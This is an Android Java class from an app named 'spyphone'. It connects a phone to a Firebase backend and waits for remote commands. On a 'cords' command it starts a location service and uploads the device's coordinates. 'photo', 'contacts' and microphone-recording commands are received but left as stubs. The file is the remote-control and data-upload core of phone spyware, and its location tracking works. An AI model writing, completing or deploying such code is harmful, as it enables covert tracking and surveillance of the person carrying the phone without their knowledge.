package emit.esy.es.spyphone.util;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.os.Messenger;
import android.util.Log;

import com.firebase.client.AuthData;
import com.firebase.client.ChildEventListener;
import com.firebase.client.DataSnapshot;
import com.firebase.client.Firebase;
import com.firebase.client.FirebaseError;

import java.util.HashMap;
import java.util.Map;

import emit.esy.es.spyphone.R;
import emit.esy.es.spyphone.services.LocationService;

/**
 * Created by Emil Makovac on 24/04/2015.
 */
public class FirebaseUtil {

    private static final String LOG_TAG = "FirebaseUtil";
    String username, password;
    volatile String id;
    Firebase ref, userRef;
    Context context;

    public FirebaseUtil(Context context, String username, String password){
        this.context = context;
        this.username = username;
        this.password = password;
    }

    private void createUser() {
        ref.createUser(username, password, new Firebase.ValueResultHandler<Map<String, Object>>() {

            @Override
            public void onSuccess(Map<String, Object> result) {
                Log.d(LOG_TAG, "CreateUser SUCCESS");
                Log.d(LOG_TAG, "CreateUser ID- " + result.get("uid").toString());
                id= result.get("uid").toString();
                setOnline(id, false);
                //authenticate user
                authenticateUser();

            }

            @Override
            public void onError(FirebaseError firebaseError) {
                Log.d(LOG_TAG, "CreateUser ERROR");
            }
        });
    }

    public void authenticateUser() {
        ref = new Firebase(context.getString(R.string.domain));
        ref.authWithPassword(username, password, new Firebase.AuthResultHandler() {

            @Override
            public void onAuthenticated(AuthData authData) {
                id = authData.getUid();
                Log.d(LOG_TAG, "Authenticate user ID- " + id);
                setUpChildRef();
            }

            @Override
            public void onAuthenticationError(FirebaseError firebaseError) {
                //If error == no such user, create user
                switch (firebaseError.getCode()) {
                    case FirebaseError.USER_DOES_NOT_EXIST:
                        createUser();
                        break;
                }
            }
        });

    }

    Handler handler = new Handler() {
        @Override
        public void handleMessage(Message msg) {

            // do whatever with the bundle here
            uploadToFirebase(msg.getData());
        }
    };

    private void uploadToFirebase(Bundle data) {
        Log.d(LOG_TAG,"uploadToFirebase");
        // get the firebase androidWrite ref
        Firebase uploadRef = getUploadRef();
        // set value for action (bundle get action)
        String action = data.getString("action");
        Object content = new Object();
        Map<String, Object> aw = new HashMap<>();
        aw.put("action", action);
        //set value for content (switch case for content return value)
        switch(action){
            case "cords":
                content = data.getDoubleArray("content");
                break;
        }
        aw.put("content", content);
        uploadRef.setValue(aw);
    }

    private Firebase getUploadRef() {
        return userRef.child("androidWrite");
    }

    public void setUpChildRef() {
        Log.d(LOG_TAG, "setUpChildRef");
        if(id != null){

            Log.d(LOG_TAG, "setUpChildRef - id: " + id);

            setOnline(id, true);

            userRef.addChildEventListener(new ChildEventListener() {
                @Override
                public void onChildAdded(DataSnapshot dataSnapshot, String s) {
                    String child = dataSnapshot.getValue().toString();
                    Log.d("ChildAdded", dataSnapshot.getKey() +" : "+child);

                }

                @Override
                public void onChildChanged(DataSnapshot dataSnapshot, String s) {
                    String child = dataSnapshot.getKey();

                    Log.d("ChildChanged", child);

                    //check if androidRead has changed
                    if(child.equals("androidRead")){
                        //check if androidRead has a string or a map of strings as a value
                        try{
                            Intent intent;
                            //if is a string
                            String childValue = (String)dataSnapshot.getValue();
                            switch (childValue){
                                case "photo":
                                    Log.d(LOG_TAG, "Starting photo service");

                                    setOnDefaultAndroidRead(dataSnapshot);
                                    break;
                                case "cords":
                                    Log.d(LOG_TAG, "Starting geo service");
                                    intent = new Intent(context, LocationService.class);
                                    intent.putExtra("messenger", new Messenger(handler));
                                    context.startService(intent);
                                    setOnDefaultAndroidRead(dataSnapshot);
                                    break;
                                case "contacts":
                                    Log.d(LOG_TAG, "Starting contacts service");
                                    setOnDefaultAndroidRead(dataSnapshot);
                                    break;
                                default:
                                    Log.d(LOG_TAG, "Wrong action, nothing to start. Value is " + childValue);
                                    break;
                            }
                        } catch (Exception e){
                            //if is a map
                            Map<String, Object> childValue;
                            childValue = (Map<String, Object>) dataSnapshot.getValue();
                            String action = childValue.get("action").toString();

                            switch (action){
                                case "mic":
                                    long duration = (long) childValue.get("secondParam");
                                    Log.d(LOG_TAG, "Starting mic service with duration " + Long.toString(duration) + " sec");
                                    //create intent to start microphone recording service with duration of recording

                                    setOnDefaultAndroidRead(dataSnapshot);
                                    break;
                            }
                        }

                    }

                }

                @Override
                public void onChildRemoved(DataSnapshot dataSnapshot) {

                }

                @Override
                public void onChildMoved(DataSnapshot dataSnapshot, String s) {

                }

                @Override
                public void onCancelled(FirebaseError firebaseError) {

                }
            });

        }
    }

    private void setOnDefaultAndroidRead(DataSnapshot dataSnapshot) {
        Log.d(LOG_TAG, "androidRead set to null");
        dataSnapshot.getRef().setValue("null");
    }

    private void setOnline(String id, boolean b) {
        userRef = ref.child(id);
        Map<String, Object> user = new HashMap<String, Object>();
        user.put("isOnline", b);
        user.put("androidRead", "null");
        Map<String, Object> connOnline = new HashMap<String, Object>();
        connOnline.put("isOnline", false);
        if(b){
            userRef.updateChildren(user);
            userRef.onDisconnect().updateChildren(connOnline);
        } else {
            userRef.setValue(user);
            userRef.onDisconnect().updateChildren(connOnline);
        }
    }
}
